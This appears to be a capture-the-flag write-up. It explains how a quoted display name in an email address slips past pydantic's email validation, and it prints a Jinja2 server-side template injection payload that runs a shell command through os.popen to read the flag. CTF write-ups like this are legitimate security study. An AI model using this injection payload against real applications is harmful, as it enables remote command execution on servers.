## Challenge

After looking deeper into what defines an email, we find that pydantic uses email-validator which follows RFC 5321 which defines what is an email, this allows either of the following:

```
test@example.com
"John Doe" <test@example.com>
```

Using that we can bypass the restrictions on from email-validator which lets us put our SSTI inside the quoted message.

{% raw %}

```
"{{cycler.__init__.__globals__.os.popen('../getflag').read()}}" <e@e.eu>
```

{% endraw %}

Running the `../getflag` program will give us the flag.
